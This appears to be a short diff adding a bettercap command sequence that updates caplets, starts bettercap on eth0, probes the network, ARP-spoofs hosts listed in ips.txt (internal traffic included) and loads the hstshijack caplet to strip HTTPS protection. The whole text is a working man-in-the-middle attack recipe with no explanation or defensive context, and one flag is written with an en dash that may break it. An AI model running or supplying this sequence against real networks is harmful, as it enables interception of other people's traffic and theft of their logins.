@@ -1,0 +1,7 @@
+caplets.update
+sudo bettercap –-silent -iface eth0
+net.probe on
+set arp.spoof.targets ips.txt
+set arp.spoof.internal true
+set arp.spoof on
+hstshijack/hstshijack
